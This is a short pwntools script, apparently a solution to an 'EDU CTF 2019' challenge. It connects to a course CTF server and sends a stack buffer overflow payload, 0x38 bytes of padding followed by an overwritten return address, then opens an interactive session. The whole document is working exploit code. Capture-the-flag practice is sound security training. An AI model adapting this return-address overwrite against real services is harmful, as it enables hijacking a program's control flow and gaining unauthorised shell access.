from pwn import *

r= remote('edu-ctf.csie.org','10170')

payload = 'A'*0x38 + p64(0x400688)

r.recvuntil('Welcome to EDU CTF 2019.')
r.sendline(payload)
r.interactive()


